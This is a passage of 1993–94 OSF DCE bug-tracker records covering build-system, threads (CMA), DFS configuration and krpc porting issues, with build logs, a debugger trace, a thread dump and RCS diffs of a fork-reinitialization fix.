 -I/users/mhickey/sb/dce103/export/hp800/usr/include
-I/users/mhickey/sb/dce103/export/hp800/usr/include
-I/project/dce/build/dce1.0.3/export/hp800/usr/include
../../../../../../../src/test/systest/directory/gds/gds_xds_str_001/xx.c
c89      -z -Wl,-Bimmediate,-Bnonfatal,-a,default,+b,/lib:/usr/lib
-L/users/mhickey/sb/dce103/export/hp800/usr/shlib
-L/users/mhickey/sb/dce103/export/hp800/usr/shlib
-L/project/dce/build/dce1.0.3/export/hp800/usr/shlib -L/usr/shlib
-L/users/mhickey/sb/dce103/export/hp800/usr/lib
-L/users/mhickey/sb/dce103/export/hp800/usr/lib
-L/project/dce/build/dce1.0.3/export/hp800/usr/lib   -o xx.X xx.o     
mv xx.X xx

mhickey@darkman[wkon-dce103](352)% build
relative path: ./test/systest/directory/gds/gds_xds_str_001
cd ../../../../../../obj/hp800/test/systest/directory/gds/gds_xds_str_001
exec make MAKEFILE_PASS=FIRST  _SUBMAKE_=_IS_SUBMAKE_  build_all
exec make MAKEFILE_PASS=FIRSTA  _SUBMAKE_=_IS_SUBMAKE_  build_all
exec make MAKEFILE_PASS=FIRSTB  _SUBMAKE_=_IS_SUBMAKE_  build_all
exec make MAKEFILE_PASS=THIRD  _SUBMAKE_=_IS_SUBMAKE_  build_all
exec make MAKEFILE_PASS=BASIC  _SUBMAKE_=_IS_SUBMAKE_  build_all
mhickey@darkman[wkon-dce103](353)% touch yy.h
mhickey@darkman[wkon-dce103](354)% build
relative path: ./test/systest/directory/gds/gds_xds_str_001
cd ../../../../../../obj/hp800/test/systest/directory/gds/gds_xds_str_001
exec make MAKEFILE_PASS=FIRST  _SUBMAKE_=_IS_SUBMAKE_  build_all
exec make MAKEFILE_PASS=FIRSTA  _SUBMAKE_=_IS_SUBMAKE_  build_all
exec make MAKEFILE_PASS=FIRSTB  _SUBMAKE_=_IS_SUBMAKE_  build_all
exec make MAKEFILE_PASS=THIRD  _SUBMAKE_=_IS_SUBMAKE_  build_all
exec make MAKEFILE_PASS=BASIC  _SUBMAKE_=_IS_SUBMAKE_  build_all
c89 -c    -D_SHARED_LIBRARIES    -D__hppa -Dhp9000s800 -Dhp9000s700
-D__hp9000s800 -D__hp9000s700 -DHPUX -D__hpux -Dunix +DA1.0 -D_HPUX_SOURCE
 -I.
-I/users/mhickey/sb/dce103/src/test/systest/directory/gds/gds_xds_str_001
-I/users/mhickey/sb/dce103/src/test/systest/directory/gds/gds_xds_str_001
-I/project/dce/build/dce1.0.3/src/test/systest/directory/gds/gds_xds_str_001
 -I/users/mhickey/sb/dce103/export/hp800/usr/include
-I/users/mhickey/sb/dce103/export/hp800/usr/include
-I/project/dce/build/dce1.0.3/export/hp800/usr/include
../../../../../../../src/test/systest/directory/gds/gds_xds_str_001/xx.c
c89      -z -Wl,-Bimmediate,-Bnonfatal,-a,default,+b,/lib:/usr/lib
-L/users/mhickey/sb/dce103/export/hp800/usr/shlib
-L/users/mhickey/sb/dce103/export/hp800/usr/shlib
-L/project/dce/build/dce1.0.3/export/hp800/usr/shlib -L/usr/shlib
-L/users/mhickey/sb/dce103/export/hp800/usr/lib
-L/users/mhickey/sb/dce103/export/hp800/usr/lib
-L/project/dce/build/dce1.0.3/export/hp800/usr/lib   -o xx.X xx.o     
mv xx.X xx

So the basic HFILES functionality is working... something else must be
wrong.

[11/17/93 public]

Apparently HFILES does work as we would like. 

It actually works as follows. In our Makefile we 
have three variables set. HFILES, OFILES, PROGRAMS. We should
have another variable set dcecp_OFILES. The HFILES dependence
evaluation is done by a build internal variable called _ALL_OFILES_.
The variable is set by looping on each entry in the PROGRAMS variable. 
For each entry _ALL_OFILES_ is updated with ${.PROG.}_OFILES or, if 
that does not exist ${.PROG.}.o. Then the HFILES dependency is applied 
to all of the entries in _ALL_OFILES_.  

A third rule is really needed. When the PROGRAMS variable is only one 
entry long and niether of the previously described 
conditions exist, _ALL_OFILES_ should be set to OFILES.

[1/13/94 public]

Re-assigned this from Ken to me.

[7/1/94 public ]
Re- assigned to sally

[9/30/94 public]
As kevins 11/17/93 note says this isn't as bad as we though, and it's not
getting into 1.1...



CR Number                     : 9477
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : mx300
S/W Ref Platform              : sinix
Component Name                : thr
Subcomponent Name             : 
Short Description             : CMA always issues a poll() before I/O
Reported Date                 : 11/11/93
Found in Baseline             : 1.0.3
Found Date                    : 11/11/93
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/11/93 public]

The way that the SVR4 port of CMA works is that before every I/O call, a
poll() is done,  because file descriptors should not always be put into 
non-blocking mode.

File descriptors on SVR4, and maybe other platforms, have a "file table"
structure in the kernel which contains information about them that is shared
by processes which have that file descriptor open (how processes come to share
this file descriptor is desribed below).  One of the pieces of information
that is maintained in the "file table" is the non-blocking state of the
file descriptor.  This means that *all* processes which share that file
descriptor have the same non-blocking state.

Why is this a problem?  The dce_login program is a good example of why it
would be a problem if CMA put all (possible) file descriptors into 
non-blocking mode.  When a user invokes dce_login, all of the file
descriptors that dce_login knows about will be put into non-blocking
mode, including stdin, stdout, and stderr.  dce_login eventually gets
around to exec()ing a shell for the user, but the file descriptors, which
the shell inherits, are all still in non-blocking mode.  Now the shell is
not expecting its stdin, stdout and stderr files to be non-blocking and
thus will have problems.

Well, one might say, well you should not try to put *all* file descriptors 
into non-blocking mode.  For example, I think that the other reference 
platforms only put sockets into non-blocking mode.  This is still a problem,
though not with a shell, because if the DCE program which does this invokes
a non-DCE program, which uses the sockets opened by the DCE process,
there will be problems unless the program invoked expects
to handle non-blocking sockets.  For the SVR4 platform, we have decided to
avoid this problem and not put any file descriptors into non-blocking mode.

The real answer, I think, is to have another state associated with a CMA
file descriptor, which tells CMA that this file descriptor is "shared"
with other process.  What shared really means is:  "could be shared", since
we can never be totally sure if a file descriptor is really shared or not.
There are only a few ways that a process on SVR4 can obtain a "shared" 
file descriptor is:

    1)  The first is when a process is exec()ed and it inherits file descriptors
        from its parent.  Any file descriptors open at this point are
        shared.
    2)  When a process invokes fork(), all file descriptors open at
        that point become shared.  This is because it is impossible
        to know what the child is going to do with its open file
        descriptors.
    3)  When a process uses ioctl(...,I_SENDFD,...) to send a file descriptor
        or when a process uses ioctl(...,I_RECVFD,...) to receive a
        file descriptor.  In either case, the fd is shared.

I don't think that there are any other ways in which a process can share
a file descriptor.  Given that this is the case, it is very easy to 
implement this so that CMA should be able to set file to non-blocking mode 
if they are not shared.



CR Number                     : 9417
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : dfs_config
Short Description             : restriction in dfs_config on UFS exports
Reported Date                 : 11/9/93
Found in Baseline             : 1.0.3
Found Date                    : 11/9/93
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/9/93 public]
By using the $AGGNAME for the fileset name in the crfldbentry in
config_dfsfs(), we introduce the restriction that only one
machine in a cell can export a UFS partition with a given mount
path (unless one is the root.dfs in which case the restriction
becomes only 2 machines in a cell).  The solution is to add a
prompt for a cell-wide unique fileset name.  This solution has 
its own downside (yet another prompt).



CR Number                     : 9414
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : dfs
Subcomponent Name             : 
Short Description             : dce_krpc unable to resolve dfs_icl_printf at kload
Reported Date                 : 11/9/93
Found in Baseline             : 1.0.3
Found Date                    : 11/9/93
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : 
Transarc Status               : 

[11/9/93 public]
To make krpc icl trace work for the HP port I have done the following
porting work.
	* In src/file/kutils create HPUX and copy src/file/kutils/OSF1/Makefile
	  to it so that the krpc_dbg command can be built in 
	  obj/hp800/file/kutils.
  	* In src/rpc/kruntime/HP800, modify the following line in sysconf.h
	  
		old: #define rpc__printf printf
		new: #define rpc__printf dfs_icl_printf
	*  Rebuild the whole kruntime to get new dce_krpc.ext
	* Add the following line in rc.dfs after all kloads:
		krpc_dbg on -log cmfx -level <rpc debug level>
	  This will make krpc active in dfstrace. 
The BUG of this porting is that dfs_icl_printf cannot be resolved at the kload
time of dce_krpc.ext as this symbol is defined in dce_core.ext.
	   
Note that I have found another potential bug regarding the setting of 
"rpc debug level". When set to 0-3.5 the system crashed with 
rpc "FATAL ERROR" at rpctimer.c/538. This bug will be filed later. 
Try something else  without 1.

[11/11/93 public]
The problem described in this defect is not a standard, supported
feature of DFS (it was only implemented for the OSF/1 port).  So,
Transarc has no plans to do anything about it should it be reassigned
to us as per Bob Hathaway's 11/10/93 mail.  If this is critical for
your testing, Jean, please find someone there or at HP to do this for
you in a private build.  If not, please cancel it.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'

[11/12/93 public]

I am not looking for major porting here for 1.0.3a.

Daryl told me that HP may have a dynamic way to resolve dfs_icl_printf.

[12/10/93 public]
Change to enhancement.  Defer to 1.1.  Change responsible engineer 
to Jean for tracking purposes.



CR Number                     : 9413
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : dfs_config
Short Description             : improvements to fileset config
Reported Date                 : 11/9/93
Found in Baseline             : 1.0.3
Found Date                    : 11/9/93
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/9/93 public]
bruce-b@apollo.hp.com asked me about populating the dfstab file
for native fs partitions in config_dfsfldb() and config_dfsfs().  
I sent him the following reply:

> OK, I've looked at both config_dfsfldb() and config_dfsfs().
> Both work, but they could be improved :^>.  In config_dfsfldb(),
> we prompt for:
> 
> DEVNAME
> AGGNAME
> AGGID
> 
> and automatically figure out the mount path and assign it to DIRNAME.
> Then, we populate the dfstab as follows:
> 
> blkdev          aggname         aggtype         aggid   (fsid-for-UFS)
> $DEVNAME        $AGGNAME        ufs             $AGGID  0,,$FS_ID
> 
> ($FS_ID is returned from the fts crfldbentry command)
> 
> The bug here is that we should use the automatically determined
> $DIRNAME in the second field of dfstab instead of prompting for
> an $AGGNAME.  The current code does work, however, if the user is
> smart enough to enter the mount path for the aggregate name.
> 
> In config_dfsfs(), we prompt for:
> 
> DEVNAME
> MNTPATH
> AGGNAME
> AGGID
> 
> and populate the dfstab as follows:
> 
> blkdev          aggname         aggtype         aggid   (fsid-for-UFS)
> $DEVNAME        $MNTPATH        ufs             $AGGID  0,,$FS_ID
> 
> We are nice enough to tell the user to enter the mount path
> for the aggregate name.  However, we could go one step further
> and figure it out automatically for him as done above in
> config_dfsfldb() (assuming it works :^>).
> 
>



CR Number                     : 9402
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : thr
Subcomponent Name             : cma
Short Description             : cma fails to open stdout
Reported Date                 : 11/8/93
Found in Baseline             : 1.0.3
Found Date                    : 11/8/93
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[11/8/93 public]
The access check ACL test (accheck) fails to complete because an
invocation of acl_edit fails due to what seems like cma's failure to
open stdout.  A core dump a file called cma_dump.log is generated.
Running the file command on the core dump shows
# ls -l
total 72
-rw-r--r--   1 andi     12          3450 Nov 08 12:59 cma_dump.log
-rw-r--r--   1 andi     12         30367 Nov 08 12:59 core
# file core
core:           data or International Language text
But Bruce tried "dbx"ing the core file for acl_edit and it showed a reasonable
stack:
# dbx /opt/dcelocal/bin/acl_edit
dbx version 3.1 for AIX.
Type 'help' for help.
reading symbolic information ...
[memory image in core]
abort process in cma__abort_process at 0xd03ec094
0xd03ec094 (cma__abort_process+0x4c) 80410014          l   r2,0x14(r1)
(dbx) where
cma__abort_process(0x6) at 0xd03ec094
cma__bugcheck(0xd064f75b, 0xd064f72b, 0x1, 0xd, 0xdeadbeef, 0xdeadbeef, 0xdeadbe
ef, 0xdeadbeef) at 0xd03c2984
cma__open_general(0x1) at 0xd03e9f6c
cma__init_thread_io(0x0) at 0xd03e6ec0
cma__init_static(0x1) at 0xd03c2554
cma_init(0x20002828) at 0xd03c22b8
main(0x5, 0x2ff7f024) at 0x100002b8
(dbx) 0xd064f75b/s
d064f75b: "cma__open_general: unexpected fstat error"
(dbx) 0xd064f72b/s
d064f72b: "(open_general) fstat on fd %d returned errno %d"
The relevant portion of code in cma__init_thread_io seems to be line 820 to 833
cma_io_thread.c in dce1.0.3bl8 build.
#if (_CMA_UNIX_TYPE ==  _CMA__SVR4)
....
....
#else 
    /*
     * "Open" the files (ie, within CMA) which are open by default:
     *		stdin, stdout, stderr.  
     *
     * Ignore errors resulting from these files having been closed already.
     */
    for (i = 0; i < 3; i++) {
	TRY
	    cma__open_general (i);
	CATCH (cma_e_badparam)
	    0;
	ENDTRY
	}
#endif /* (_CMA_UNIX_TYPE ==  _CMA__SVR4) */
I say stdout because the parameter to cma__open_general is 1.
I have copied the core and cma_dump.log file into
/afs/tr/public/rajesh/acltestcmabug.
The contents of the cma_dump.log file are also included below:
%Internal DCE Threads problem (version CMA BL10+), terminating execution.
% Reason: cma__open_general: unexpected fstat error
The current thread is 1 (address 0x2008f270)
DECthreads scheduling database is locked.
Current threads:
Thread default thread (2008f270) 1 : running
  Current vp is 0
  Join: mutex 200a12a8 (21), cv 200a12f8 (2)
  Sync. wait: mutex 200a1348 (22), cv 200a1398 (3)
  Start function 0 (0)
  Thread's last errno was 0
  Scheduling: priority 12, policy throughput
  Stack: 2ff7e490 (default stack) 
  Alerts: none pending, general delivery enabled, asynch delivery disabled
Thread null thread (200a9258) 2 : ready
  No current vp
  Join: mutex 200a9fc0 (23), cv 200aa010 (4)
  Sync. wait: mutex 200aa060 (24), cv 200aa0b0 (5)
  Start function 20071b34 (0)
  Thread's last errno was 0
  Scheduling: priority 0, policy idle
  Stack: 200cdd94 (base = 200ce000, guard = 200c2fff) [<-SP]
  Alerts: none pending, general delivery enabled, asynch delivery disabled
Mutexes:
Mutex default attr's mutex (200c0c18) 1, type fast, unlocked
Mutex attr sequence object (200a0c68) 2, type fast, unlocked
Mutex known attr list (200a0cb8) 3, type fast, unlocked
Mutex mutex sequence object (200a0d08) 4, type fast, unlocked
Mutex known mutex list (200a0d58) 5, type fast, unlocked
Mutex global lock (200a0da8) 6, type recursive, unlocked
Mutex global's internal lock (200a0df8) 7, type fast, unlocked
Mutex VM, small (200a0e48) 8, type fast, unlocked
Mutex VM, medium (200a0e98) 9, type fast, unlocked
Mutex VM, large (200a0ee8) 10, type fast, unlocked
Mutex VM, pool (200a0f38) 11, type fast, unlocked
Mutex per-thread context (200a0f88) 12, type fast, unlocked
Mutex cond sequence object (200a0fd8) 13, type fast, unlocked
Mutex known cond list (200a1028) 14, type fast, unlocked
Mutex mutex for delay (200a1078) 15, type fast, unlocked
Mutex atfork queue (200a1118) 16, type fast, unlocked
Mutex one time init (200a1168) 17, type fast, unlocked
Mutex stack mutex (200a11b8) 18, type fast, unlocked
Mutex stack sequence object (200a1208) 19, type fast, unlocked
Mutex thread sequence object (200a1258) 20, type fast, unlocked
Mutex for a TCB (200a12a8) 21, type fast, unlocked
Mutex for a TCB (200a1348) 22, type fast, unlocked
Mutex null thread (200a9fc0) 23, type fast, unlocked
Mutex for a TCB (200aa060) 24, type fast, unlocked
Mutex io database (200aaf08) 25, type fast, unlocked
Mutex dynamic io init (200aaf58) 26, type fast, unlocked
Mutex file mutex (200f3c70) 27, type fast, unlocked
Mutex file mutex (200f3d60) 28, type fast, locked by 1
Condition variables:
Condition variable cond for delay (200a10c8) 1
Condition variable for a TCB (200a12f8) 2
Condition variable for a TCB (200a1398) 3
Condition variable null thread (200aa010) 4
Condition variable for a TCB (200aa0b0) 5
Condition variable file read cv (200f3cc0) 6
Condition variable file write cv (200f3d10) 7
Condition variable file read cv (200f3db0) 8
Condition variable file write cv (200f3e00) 9
DCE Threads internal VM manager statistics:
 small (24 bytes): 1 allocated, 0 free
 medium (72 bytes): 40 allocated, 0 free
 large (3424 bytes): 3 allocated, 0 free
 2 things currently on general pool list
 2 zeroed allocations (88 bytes)
 3 syscalls for 466952 bytes (1 exact size), 0 attempts failed
 50 pool extractions; 47 split from larger packets
 2 pool returns; 0 merged with previous, 0 with next
 Lookaside scrounging: 0 small, 0 medium, 0 large
 0 sbrk alignments
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[11/10/93 public]
This won't get changed for 1.0.3. We'll look at it for 1.0.3a.

[3/3/94 public]

[3/3/94 public]
We're still trying to reproduce this.
Changed Resp. Engr's Company from `tarc' to `osf'



CR Number                     : 9396
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 8396
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : osf1
Component Name                : thr
Subcomponent Name             : cma_ux.c, cma_vp.c
Short Description             : fork reinitialization can fail in child
Reported Date                 : 11/8/93
Found in Baseline             : 1.0.3
Found Date                    : 11/8/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : threads/cma_ux.c, cma_vp.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/8/93 public]

One Line Description:
   OSDqa06239 fork reinitialization can fail in child

Full Description:

Related-file:::: Problem
 DESCRIPTION:  When a child thread is in cma_fork, its cleanup must be
 reordered.  In particular, mutex cleanup must be done before any other
 kind, because it's possible that the parent contained threads that
 were waiting on a mutex.  In the child, there are no other threads.
 Also, the child's vp state should be reinitialized early, because it's
 needed for any mach calls, including self-blocks, etc.
 
 REPRODUCIBLE:  Yes.
 
 
 TEST SOFTWARE DESCRIPTION:  Heavily modified cuvb_wrp_002.

Related-file::Added 930924 by wright:: /build/hiosfm/RCS/src/dce/src/threads/./cma_ux.c,v 7.3
 /build/hiosfm/RCS/src/dce/src/threads/./cma_ux.c,v 7.3
 wright 1993/09/24 20:31:11 +18 -5
 Reason:  OSDqa06239 fork reinitialization can fail in child
 Do mutex reinit much earlier, add vp reinit early.
 
     *** /tmp/ci.4842..cma_ux.c.4874.1	Fri Sep 24 16:31:14 1993
     --- /tmp/cma_ux.c.4874.2	Fri Sep 24 16:31:14 1993
     ***************
     *** 435,456 ****
       	/*
       	 * Reinitialize required data structures, and remove all other
       	 * threads from the known threads list in forked process.
       	 */
       #if (_CMA_OSIMPL_ == _CMA__OS_OSF) && _CMA_REENTRANT_CLIB_
     !     mach_init();
       #endif
       	/*
       	 * FIX-ME:
       	 *
       	 * This is inefficient. In each case, we need to clear state and
       	 * unlock the mutexes. The two are separated because the parent
       	 * post-fork processing also unlocks, but doesn't reinit. Still,
       	 * there's no need for two separate sets of calls: the reinit
       	 * functions should be implemented as a switch() with the clear case
     ! 	 * preceeding and falling through into the unlock case.
       	 */
       	cma__unset_kernel ();	
       	cma__int_unlock (cma__g_global_lock);
       
       #if (_CMA_OSIMPL_ == _CMA__OS_OSF) && _CMA_REENTRANT_CLIB_
       	/*
     --- 435,470 ----
       	/*
       	 * Reinitialize required data structures, and remove all other
       	 * threads from the known threads list in forked process.
       	 */
       #if (_CMA_OSIMPL_ == _CMA__OS_OSF) && _CMA_REENTRANT_CLIB_
     ! 	mach_init();
       #endif
       	/*
       	 * FIX-ME:
       	 *
       	 * This is inefficient. In each case, we need to clear state and
       	 * unlock the mutexes. The two are separated because the parent
       	 * post-fork processing also unlocks, but doesn't reinit. Still,
       	 * there's no need for two separate sets of calls: the reinit
       	 * functions should be implemented as a switch() with the clear case
     ! 	 * preceding and falling through into the unlock case.
       	 */
     +         /* The preceding comment (in the original OSF source) isn't
     + 	 * accurate for the kernel threads implementation, and even if it
     + 	 * were, WHO CARES?  The additional overhead is trivial in the
     + 	 * larger scheme of things.  You'd need to pass a second parameter
     + 	 * to determine whether this were the parent or the child, BTW.
     + 	 */
     + 
     +         /* We must reinit mutexes before doing any unlocks, because there
     + 	 * could be inherited waiters on the mutexes, and they don't exist
     + 	 * in the child, so don't try to wake them!
     + 	 */
     + 	cma__reinit_mutex (cma__c_reinit_postfork_clear);
     +         cma__reinit_self_vp ();
     + 
       	cma__unset_kernel ();	
       	cma__int_unlock (cma__g_global_lock);
       
       #if (_CMA_OSIMPL_ == _CMA__OS_OSF) && _CMA_REENTRANT_CLIB_
       	/*
     ***************
     *** 482,492 ****
       	cma__reinit_timer (cma__c_reinit_postfork_unlock);
       	cma__reinit_memory (cma__c_reinit_postfork_clear);
       	cma__reinit_memory (cma__c_reinit_postfork_unlock);
       	cma__reinit_signal (cma__c_reinit_postfork_clear);
       	cma__reinit_signal (cma__c_reinit_postfork_unlock);
     - 	cma__reinit_mutex (cma__c_reinit_postfork_clear);
       	cma__reinit_mutex (cma__c_reinit_postfork_unlock);
       	cma__reinit_attr (cma__c_reinit_postfork_clear);
       	cma__reinit_attr (cma__c_reinit_postfork_unlock);
       
       	/* don't rearrange the following unless you really know what
     --- 496,505 ----
 
Related-file::Added 930924 by ddts:: 
 /build/hiosfm/RCS/src/dce/src/threads/./cma_vp.c,v 7.6
 wright 1993/09/24 20:32:09 +140 -120
 Reason:  OSDqa06239 fork reinitialization can fail in child
 Rearrange vp reinit code, add self_reinit routine.
 
     *** /tmp/ci.4887..cma_vp.c.4925.1	Fri Sep 24 16:32:12 1993
     --- /tmp/cma_vp.c.4925.2	Fri Sep 24 16:32:12 1993
     ***************
     *** 155,266 ****
       
       /*
        * LOCAL MACROS
        */
       
     - /*
     -  * LOCAL FUNCTIONS
     -  */
       
       /*
        *  FUNCTIONAL DESCRIPTION:
        *
     !  *	initialize the VP layer
        *
        *  FORMAL PARAMETERS:
        *
     !  *	none
        *
        *  IMPLICIT INPUTS:
        *
     !  *	the current kernel thread
        *
        *  IMPLICIT OUTPUTS:
        *
     !  *	none
        *
        *  FUNCTION VALUE:
        *
     !  *	none
        *
        *  SIDE EFFECTS:
        *
     !  *	none
     !  * 
        */
     ! void
     ! cma__init_vp
       #ifdef _CMA_PROTO_
     ! 	(void)
       #else	/* no prototypes */
     ! 	()
       #endif	/* prototype */
           {
       #if _CMA_KTHREADS_ == _CMA__MACH
     !     kern_return_t	status;
     !     thread_t		virtual_processor;
     !     port_t		synch_port;
     !     cma__t_vstruct	*vp_struct;
     !     task_t		task;
       
     ! 
     !     task = task_self ();
     !     cma__trace ((
     ! 	    cma__c_trc_init | cma__c_trc_vp,
     ! 	    "(init_vp) running in task %d",
     ! 	    task));
       
     !     /*
     !      * Set up default VP
     !      */
     !     cma__queue_init (&cma___g_vp_queue);
     !     cma__queue_init (&cma___g_vp_cache);
     !     virtual_processor = thread_self ();
     !     status = port_allocate (task, &synch_port);
       
     !     cma__trace ((
       	    cma__c_trc_init | cma__c_trc_vp,
     ! 	    "(init_vp) running in vp %d, synch port is %d",
     ! 	    virtual_processor,
       	    synch_port));
       
     !     if (status != KERN_SUCCESS) {
     ! 	cma__trace ((
       		cma__c_trc_init | cma__c_trc_vp | cma__c_trc_bug,
     ! 		"(init_vp) error \"%s\" (%d) allocating def. VP synch port",
       		mach_error_string (status),
       		status));
     ! 	cma__bugcheck ("init_vp: port_allocate");
       	}
       
     !     status = port_disable (task, synch_port);
     !     if ((status != KERN_SUCCESS) && (status != KERN_NOT_IN_SET)) {
     ! 	cma__trace ((
       		cma__c_trc_init | cma__c_trc_vp | cma__c_trc_bug,
     ! 		"(init_vp) error \"%s\" (%d) disabling port %d",
       		mach_error_string (status),
       		status,
       		synch_port));
     ! 	cma__bugcheck ("init_vp: port_disable");
       	}
       
     !     if ((status = port_set_backlog (task, synch_port, 1)) != KERN_SUCCESS) {
     ! 	cma__trace ((
       		cma__c_trc_init | cma__c_trc_vp | cma__c_trc_bug,
     ! 		"(init_vp) error \"%s\" (%d) setting port %d backlog",
       		mach_error_string (status),
       		status,
       		synch_port));
     ! 	cma__bugcheck ("init_vp: port_set_backlog");
       	}
       
           vp_struct = cma__alloc_object (cma__t_vstruct);
     -     vp_struct->vp = virtual_processor;
     -     vp_struct->synch = synch_port;
     -     vp_struct->flags = cma__c_vp_running | cma__c_vp_default;
           cma__queue_insert (&vp_struct->queue, &cma___g_vp_queue);
           cma__queue_init(&vp_struct->stack);
       #endif
           }
       
       /*
        *  FUNCTIONAL DESCRIPTION:
     --- 155,309 ----
       
       /*
        * LOCAL MACROS
        */
       
       
       /*
        *  FUNCTIONAL DESCRIPTION:
        *
     !  *	cma___load_vp:  load a vp with mach values for current thread
     !  *      (the thread is assumed to be the inital thread of the process)
        *
        *  FORMAL PARAMETERS:
        *
     !  *	flag
        *
        *  IMPLICIT INPUTS:
        *
     !  *	None
        *
        *  IMPLICIT OUTPUTS:
        *
     !  *	None
        *
        *  FUNCTION VALUE:
        *
     !  *	None
        *
        *  SIDE EFFECTS:
        *
     !  *	None
        */
     ! static void
     ! cma___load_vp
       #ifdef _CMA_PROTO_
     ! 	(
     ! 	cma__t_int_tcb	*cur_tcb,
     ! 	cma__t_vpid	cur_vp)
       #else	/* no prototypes */
     ! 	(cur_tcb, cur_vp)
     ! 	cma__t_int_tcb	*cur_tcb;
     ! 	cma__t_vpid	cur_vp;
       #endif	/* prototype */
           {
       #if _CMA_KTHREADS_ == _CMA__MACH
     ! 	thread_t	self;
     ! 	kern_return_t	status;
     ! 	port_t		synch_port;
     ! 	task_t		task;
       
     ! 	/*
     ! 	 * Find out who we are, reload our vp
     ! 	 */
       
     ! 	task = task_self ();
     ! 	self = thread_self ();
     ! 	status = port_allocate (task, &synch_port);
       
     ! 	cma__trace ((
       	    cma__c_trc_init | cma__c_trc_vp,
     ! 	    "(load_vp) running in tcb %x, vpid %x, vp %d, synch is %d",
     ! 	    cur_tcb,
     ! 	    cur_vp,
     ! 	    self,
       	    synch_port));
       
     ! 	if (status != KERN_SUCCESS) {
     ! 	    cma__trace ((
       		cma__c_trc_init | cma__c_trc_vp | cma__c_trc_bug,
     ! 		"(load_vp) error \"%s\" (%d) allocating def. VP synch port",
       		mach_error_string (status),
       		status));
     ! 	    cma__bugcheck ("load_vp: port_allocate");
       	}
       
     ! 	status = port_disable (task, synch_port);
     ! 	if ((status != KERN_SUCCESS) && (status != KERN_NOT_IN_SET)) {
     ! 	    cma__trace ((
       		cma__c_trc_init | cma__c_trc_vp | cma__c_trc_bug,
     ! 		"(load_vp) error \"%s\" (%d) disabling port %d",
       		mach_error_string (status),
       		status,
       		synch_port));
     ! 	    cma__bugcheck ("load_vp: port_disable");
       	}
       
     ! 	if ((status = port_set_backlog (task, synch_port, 1)) != KERN_SUCCESS) {
     ! 	    cma__trace ((
       		cma__c_trc_init | cma__c_trc_vp | cma__c_trc_bug,
     ! 		"(load_vp) error \"%s\" (%d) setting port %d backlog",
       		mach_error_string (status),
       		status,
       		synch_port));
     ! 	    cma__bugcheck ("load_vp: port_set_backlog");
       	}
     + 	
     + 	cur_vp->vp = self;
     + 	cur_vp->synch = synch_port;
     + 	cur_vp->flags = cma__c_vp_running | cma__c_vp_default;
     + #endif
     +     }
     + /*
     +  * LOCAL FUNCTIONS
     +  */
     + 
     + /*
     +  *  FUNCTIONAL DESCRIPTION:
     +  *
     +  *	initialize the VP layer
     +  *
     +  *  FORMAL PARAMETERS:
     +  *
     +  *	none
     +  *
     +  *  IMPLICIT INPUTS:
     +  *
     +  *	the current kernel thread
     +  *
     +  *  IMPLICIT OUTPUTS:
     +  *
     +  *	none
     +  *
     +  *  FUNCTION VALUE:
     +  *
     +  *	none
     +  *
     +  *  SIDE EFFECTS:
     +  *
     +  *	none
     +  * 
     +  */
     + void
     + cma__init_vp
     + #ifdef _CMA_PROTO_
     + 	(void)
     + #else	/* no prototypes */
     + 	()
     + #endif	/* prototype */
     +     {
     + #if _CMA_KTHREADS_ == _CMA__MACH
     +     cma__t_vstruct	*vp_struct;
     + 
       
     +     cma__queue_init (&cma___g_vp_queue);
     +     cma__queue_init (&cma___g_vp_cache);
           vp_struct = cma__alloc_object (cma__t_vstruct);
           cma__queue_insert (&vp_struct->queue, &cma___g_vp_queue);
           cma__queue_init(&vp_struct->stack);
     + 
     +     cma___load_vp(NULL, vp_struct);
       #endif
           }
       
       /*
        *  FUNCTIONAL DESCRIPTION:
     ***************
     *** 290,300 ****
        *      this code was removed from the reinit_vp routine since it's
        *	needed twice
        *
        */
       #if _CMA_KTHREADS_ == _CMA__MACH
     ! static
       cma___del_vpid
       #ifdef _CMA_PROTO_
       	(
       	cma__t_queue	*qptr)
       #else	/* no prototypes */
     --- 333,343 ----
        *      this code was removed from the reinit_vp routine since it's
        *	needed twice
        *
        */
       #if _CMA_KTHREADS_ == _CMA__MACH
     ! static void
       cma___del_vpid
